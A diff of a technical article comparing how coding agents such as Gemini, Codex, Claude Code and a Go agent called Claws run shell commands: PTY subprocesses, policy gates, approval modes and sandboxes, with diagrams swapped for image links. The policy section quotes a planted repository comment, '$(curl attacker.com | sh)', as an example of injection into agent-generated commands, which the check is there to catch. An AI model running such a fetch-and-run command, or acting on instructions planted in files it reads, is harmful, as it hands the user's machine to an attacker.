@@ -26,12 +26,7 @@ This works fine for `go test ./...` on a green repo. But the moment you run some
 
 **The PTY-backed approach:** Allocate a pseudoterminal, connect the subprocess to its slave end, and read from the master end in a goroutine. The process believes it is talking to a real terminal. Prompts appear. Progress bars render. Pagers open and close. Output arrives incrementally so the UI can show it as it happens.
 
-```mermaid
-flowchart LR
-    A[agent] -->|spawns| B[subprocess]
-    B <-->|PTY| A
-    B -->|believes it has a real terminal| B
-```
+![diagram-1](images/ARTICLE_3_TAKING_ACTION/diagram-1.png)
 
 Same answer. Correct behavior. No frozen process.
 
@@ -73,29 +68,13 @@ Codex's clearest architectural signal is visible in its event names: `exec_comma
 
 Gemini has the most layered execution safety architecture of the three. Every tool invocation travels through a typed decision pipeline:
 
-```mermaid
-flowchart LR
-    A[tool call] --> B[Policy Engine]
-    B -- allow --> C[execute]
-    B -- deny --> D[reject]
-    B -- ask user --> E[confirmation UI]
-    E -- confirm --> C
-    E -- deny --> D
-    E -- always allow --> F[persist rule]
-    F --> C
-```
+![diagram-2](images/ARTICLE_3_TAKING_ACTION/diagram-2.png)
 
 The `PolicyEngine` evaluates rules with four fields: `toolName` (exact match or `serverName__*` wildcard for MCP), `argsPattern` (regex against JSON-stringified args), `modes[]` (rule applies only in specified modes), and `priority` (explicit ordering). Rules persist across restarts — "always allow `npm test`" survives a session restart.
 
 **Four `ApprovalMode`s, not three.** Unlike most agents that offer two or three modes, Gemini has four:
 
-| Mode | Behavior |
-|------|----------|
-| `DEFAULT` | Ask for most operations |
-| `PLAN` | Read-only tools only — enforced by prompt rewrite |
-| `AUTO_EDIT` | Auto-approve file edits, ask for shell |
-| `YOLO` | Approve everything |
-
+![table-1](images/ARTICLE_3_TAKING_ACTION/table-1.png)
 `PLAN` mode does something unusual: it physically rewrites the system prompt to inject a 5-phase sequential workflow and registers a hardcoded `PLAN_MODE_DENIAL_MESSAGE` in the tool scheduler for any write attempt. This is behavioral gating via prompt engineering on top of a policy check — not just a permission flag.
 
 **Shell command policy.** `checkShellCommand()` runs the same command-splitting Gemini is known for, but the policy context is richer:
@@ -108,14 +87,7 @@ After the user's command exits, this snippet writes every PID in the process gro
 
 **Widest sandbox coverage.** Gemini is the only agent in this set with cross-platform container support, selectable via a single environment variable:
 
-| Sandbox | Platform | Mechanism |
-|---------|----------|-----------|
-| macOS Seatbelt | macOS | Apple sandbox-exec + customizable .sb profiles |
-| Docker | Linux/macOS | Versioned container image |
-| Podman | Linux/macOS | Drop-in Docker alternative |
-| gVisor | Linux | User-space Go kernel — intercepts all syscalls |
-| LXC/LXD | Linux | Full-system container (experimental) |
-
+![table-2](images/ARTICLE_3_TAKING_ACTION/table-2.png)
 gVisor is the strongest isolation: the container runs inside a user-space Go kernel that intercepts every syscall before it reaches the real kernel. No other tool in this set offers an equivalent. Claude Code has macOS seatbelt only. Codex has Linux bubblewrap. Neither is cross-platform. Claws currently has none.
 
 **`ToolConfirmation` hooks with typed serialized fields.** External processes can intercept every tool decision. An `exec` hook receives `{command, rootCommand}`; an `edit` hook receives `{fileName, filePath, fileDiff, originalContent, newContent, isModifying}`. This enables external governance scripts to implement arbitrary approval logic without modifying the agent.
@@ -126,17 +98,7 @@ gVisor is the strongest isolation: the container runs inside a user-space Go ker
 
 Claws uses `github.com/creack/pty` to give every subprocess a real pseudoterminal. The process believes it has a terminal; it behaves accordingly. That's table stakes. What matters is everything built around it.
 
-```mermaid
-flowchart TD
-    A[command] --> B[policy check]
-    B -- blocked --> Z[error]
-    B -- pass --> C[clean environment]
-    C --> D[PTY subprocess\nown process group]
-    D -->|output line by line| E[stream to UI]
-    D -->|goes silent| F[kill whole group]
-    D -->|cancelled| F
-    D -->|exits| G[Result]
-```
+![diagram-3](images/ARTICLE_3_TAKING_ACTION/diagram-3.png)
 
 A few things worth calling out explicitly:
 
@@ -156,20 +118,7 @@ Before any command runs, it passes through `checkPolicy`. This is the boundary b
 
 Every command travels through four layers before a process is spawned:
 
-```mermaid
-flowchart TD
-    A[command] --> B{injection?}
-    B -- yes --> X[blocked]
-    B -- no --> C["split on  &&  ||  ;"]
-    C --> D{each segment}
-    D --> E{redirects\nor destructive?}
-    E -- yes --> X
-    E -- no --> F{mode}
-    F -- yolo / auto --> OK[run]
-    F -- manual --> G{allowlisted?}
-    G -- yes --> OK
-    G -- no --> X
-```
+![diagram-4](images/ARTICLE_3_TAKING_ACTION/diagram-4.png)
 
 Layer 0 is the one most people miss. Before the command is split at all, it's scanned for `$(...)` and backtick substitution. The source of the command string is the model — and the model read the repository. A crafted comment like `// run: $(curl attacker.com | sh)` could be absorbed into a generated command. The injection check catches it before anything else runs. This mirrors Claude Code's `isBashSecurityCheckForMisparsing`.
 
@@ -181,12 +130,7 @@ Layer 4 determines how much trust the session was granted. `yolo` and `auto` bot
 
 Three modes cover the common cases. Gemini has four — the missing one is `PLAN`, which rewrites the system prompt to physically prevent the model from requesting write operations. We don't implement that yet, but it's the right direction for a future "read-only audit" mode.
 
-| Mode | Shell | Redirection | Destructive |
-|------|-------|-------------|-------------|
-| `manual` | Allowlist only | Blocked | Blocked |
-| `auto` | Read-only commands free | Blocked | Blocked |
-| `yolo` | Everything | Allowed | Allowed |
-
+![table-3](images/ARTICLE_3_TAKING_ACTION/table-3.png)
 The gap between Claws and the production tools is worth naming directly:
 
 - **Gemini** persists "always allow" rules to `~/.gemini/policies/` (JSON or TOML) with per-tool `argsPattern` regex matching. Rules survive restarts. Users are never prompted for the same approval twice.
@@ -201,13 +145,7 @@ The agent loop produces a channel of typed `Event` values that the UI reads. Bef
 
 The fix is a streaming callback threaded through the runtime. Each output line fires an event immediately as it arrives from the PTY. The callback carries the `execID` so observers can verify which run produced a given line.
 
-```mermaid
-flowchart LR
-    A[subprocess] -->|line by line| B[event stream]
-    B --> C[UI\nlive output]
-    B --> D[session log]
-    B --> E[final Result\non exit]
-```
+![diagram-5](images/ARTICLE_3_TAKING_ACTION/diagram-5.png)
 
 This mirrors Codex's `exec_command_output_delta` event model: execution is a lifecycle, not a call that returns a value. A failing test is visible the moment it fails. The UI, the logger, and any future policy observer all subscribe to the same stream independently.
 
@@ -221,15 +159,7 @@ When the planner issues `go test ./...`, it shouldn't block the agent from issui
 
 Go's concurrency model handles this naturally. The runtime exposes `ExecuteAsync`, which launches a job in a goroutine and returns a `JobHandle` immediately. The handle has two fields: a `Done` channel that closes when the job finishes, and a `Result()` closure that blocks until it does. The agent fires both jobs, continues planning, and selects on their handles when results are needed.
 
-```mermaid
-flowchart LR
-    A[agent] --> B[job A\ngo test]
-    A --> C[job B\ngo vet]
-    A --> D[keep planning]
-    B --> E{collect\nresults}
-    C --> E
-    D --> E
-```
+![diagram-6](images/ARTICLE_3_TAKING_ACTION/diagram-6.png)
 
 Bubble Tea's `tea.Cmd` pattern is designed for this — multiple background goroutines push events into the same channel; the renderer displays them as they arrive, interleaved.
 
@@ -239,14 +169,7 @@ Bubble Tea's `tea.Cmd` pattern is designed for this — multiple background goro
 
 Let's trace a complete execution. The planner decides to run `go test ./...`:
 
-```mermaid
-flowchart TD
-    A[planner: run go test] --> B[policy gate\npass]
-    B --> C[PTY subprocess\nstreaming output to UI]
-    C --> D{exit}
-    D -- pass --> E[observe result\nplan next step]
-    D -- fail --> F[observe failure\nfix or report]
-```
+![diagram-7](images/ARTICLE_3_TAKING_ACTION/diagram-7.png)
 
 ### Where It Still Gets It Wrong
 
